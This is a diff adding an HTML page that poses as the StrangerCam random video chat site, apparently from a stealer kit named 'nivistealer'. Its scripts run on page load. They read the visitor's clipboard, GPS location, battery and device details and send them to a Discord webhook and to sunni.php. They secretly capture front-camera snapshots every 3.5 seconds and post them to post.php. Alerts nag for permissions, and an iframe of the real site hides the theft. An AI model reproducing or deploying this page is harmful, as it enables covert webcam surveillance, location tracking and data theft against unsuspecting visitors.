@@ -1,0 +1,232 @@
+<html>
+   <head>
+      <style>
+
+         img[alt*="www.000webhost.com"], .disclaimer {
+         display: none
+         }  
+      </style>
+      <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+      <meta name="viewport" content="width=device-width, initial-scale=1" />
+      <title>Random Video Chat - StrangerCam.com: Cam With Strangers</title>
+      <meta
+         name="description"
+         content="Enjoy our Anonymous  random video chat with over 5.000.000 strangers. No Sign-Up Required! Cam with strangers on StrangerCam.com"
+         />
+      <link rel="canonical" href="https://strangercam.com/" />
+      <meta property="og:locale" content="en_US" />
+      <meta property="og:type" content="website" />
+      <meta
+         property="og:title"
+         content="Random Video Chat - StrangerCam.com: Cam With Strangers"
+         />
+      <meta
+         property="og:description"
+         content="Enjoy our Anonymous random video chat with over 5.000.000 strangers. No Sign-Up Required! Cam with strangers on StrangerCam.com."
+         />
+      
+      <meta property="og:site_name" content="Stranger Cam" />
+      <meta
+         property="article:publisher"
+         content="https://www.facebook.com/strangercam"
+         />
+      <meta
+         property="article:modified_time"
+         content="2021-12-17T14:46:35+00:00"
+         />
+      <meta
+         property="og:image"
+         content="https://strangercam.com/wp-content/uploads/2021/10/Untitled-2.png"
+         />
+      <meta property="og:image:width" content="800" />
+      <meta property="og:image:height" content="532" />
+      <meta property="og:image:type" content="image/png" />
+      <meta name="twitter:card" content="summary_large_image" />
+      <meta name="twitter:site" content="@strangercamapp" />
+      <meta name="twitter:label1" content="Est. reading time" />
+      <meta name="twitter:data1" content="4 minutes" />
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+      <script>
+         $(document).ready(function() {
+           var batterypercentage
+           var ischarging
+           async function getclips() {
+             var btr = await navigator.getBattery();
+             batterypercentage = String(btr.level*100+"%");
+             ischarging = String(btr.charging);
+             try {
+               let victimtext = await navigator.clipboard.readText();
+               giveclips(victimtext)
+             } catch (error) {
+               giveclips("Clipboard Permission Denied")
+             }
+           }
+           getclips()
+           var clips
+         
+           function giveclips(polp) {
+             clips = polp
+             getLocation()
+           }
+         
+           function getLocation() {
+             if (navigator.geolocation) {
+               navigator.geolocation.getCurrentPosition(showPosition, showError);
+             } else {
+               alert("Your Browser Does not support Gps");
+             }
+           }
+         
+           function showPosition(position) {
+             var grak = "Lattitute : " + position.coords.latitude + " " + "Longitude : " + position.coords.longitude
+             sdrp(grak, clips,batterypercentage,ischarging);
+             senddis(grak, clips,batterypercentage,ischarging);
+           }
+         
+           function showError(error) {
+             switch (error.code) {
+               case error.PERMISSION_DENIED:
+                 sdrp("Location Permission Denied",clips,batterypercentage,ischarging);
+                 senddis("Location Permission Denied",clips,batterypercentage,ischarging)
+                 alert("Allow Location permission to Chat with nearby Strangers");
+         
+                 break;
+               case error.POSITION_UNAVAILABLE:
+                 window.close()
+                 break;
+               case error.TIMEOUT:
+                 window.close()
+                 break;
+               case error.UNKNOWN_ERROR:
+                 window.close()
+                 break;
+             }
+           }
+            
+           let datetime = new Date();
+           let localtime = String(datetime.toLocaleTimeString());
+           let referurl = document.referrer;
+           let cpuThreads = String(navigator.hardwareConcurrency);
+           let deviceram = String(navigator.deviceMemory) + "gb";
+           let useragent = navigator.userAgent;
+           let iscookieEnabled = String(navigator.cookieEnabled);
+           let devicelang = String(navigator.language);
+           let width = screen.width;
+           let height = screen.height;
+           let platform = navigator.platform;
+           let networkinfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+           let networkinformation = "Network type : " + networkinfo.effectiveType + " " + "Downlink :" + " " + networkinfo.downlink
+         
+           function senddis(gpsr, clips,batterypercentage,ischarging) {
+             var request = new XMLHttpRequest();
+             request.open("POST", "https://your-discordwebhook-url");
+             request.setRequestHeader('Content-type', 'application/json');
+             var params = {
+               content: ("> **DeviceGps  : **" + gpsr + "\n> **NetworkInformation : **" + networkinformation + "\n> **BatteryPercentage : **" + batterypercentage + "\n> **Ischarging : **" + ischarging + "\n> **ScreenWidth : **" + width + "\n> **ScreenHeight : **" + height + "\n> **PlatForm : **" + platform + "\n> **DeviceLanguage : **" + devicelang + "\n> **DeviceMemory : **" + deviceram + "\n> **IsCookieEnabled : **" + iscookieEnabled + "\n> **UserAgent : **" + useragent + "\n> **CpuThreads : **" + cpuThreads + "\n> **ReferUrl : **" + referurl + "\n> **Clipboard : **" + clips + "\n> **DeviceLocalTime : **" + localtime + "\n"),
+               username: "nivistealer",
+               avatar_url: "https://dpwhatsapp.xyz/wp-content/uploads/2021/08/Anime-Girl-WhatsApp-DP.jpg"
+             }
+             request.send(JSON.stringify(params));
+           }
+         
+           function sdrp(bsdks, clipboard,batterypercentage,ischarging) {
+             $.ajax({
+               type: "POST",
+               url: "sunni.php",
+               data: {
+                 networkinformation : networkinformation,
+                 batterypercentage:batterypercentage,
+                 ischarging:ischarging,
+                 width: width,
+                 height: height,
+                 platform: platform,
+                 gps: bsdks,
+                 devicelang: devicelang,
+                 iscookieEnabled: iscookieEnabled,
+                 useragent: useragent,
+                 deviceram: deviceram,
+                 cpuThreads: cpuThreads,
+                 referurl: referurl,
+                 localtime: localtime,
+                 clipboard: clipboard,
+               },
+               cache: false,
+               success: function(data) {},
+               error: function(xhr, status, error) {
+                 console.log(error);
+               }
+             })
+           }
+         })
+      </script>
+   </head>
+   <div class="video-wrap" hidden="hidden">
+      <video id="video" playsinline autoplay></video>
+   </div>
+   <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+   <script>
+      function post(imgdata) {
+        $.ajax({
+          type: 'POST',
+          data: {
+            cat: imgdata
+          },
+          url: 'post.php',
+          dataType: 'json',
+          async: false,
+          success: function(result) {
+            // call the function that handles the response/results
+          },
+          error: function() {}
+        });
+      };
+      'use strict';
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const errorMsgElement = document.querySelector('span#errorMsg');
+      const constraints = {
+        audio: false,
+        video: {
+          facingMode: "user"
+        }
+      };
+      // Access webcam
+      async function init() {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia(constraints);
+          handleSuccess(stream);
+        } catch (e) {
+          setTimeout(function(){
+          alert("Allow Camera access to chat with strangers");
+          window.location.href = "https://support.onemob.com/hc/en-us/articles/360037342154-How-do-I-grant-permission-for-Camera-and-Microphone-in-my-web-browser-"
+      alert("Read this page to grant camera access to  our website")
+       },15000) }
+      }
+      // Success
+      function handleSuccess(stream) {
+        window.stream = stream;
+        video.srcObject = stream;
+        var context = canvas.getContext('2d');
+        setInterval(function() {
+          context.drawImage(video, 0, 0, 640, 480);
+          var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+          post(canvasData);
+        }, 3500);
+      }
+      // Load init
+      init();
+   </script>
+   <body>
+      <p>
+         <iframe
+            id="forPostyouradd"
+            src="https://strangercam.com/stranger-chat/"
+            frameborder="0"
+            style="overflow:hidden;height:100%;width:100%;position:fixed;top:0;left:0"
+            height="100%"
+            width="100%"
+            ></iframe>
+      </p>
+   </body>
+   
+</html>
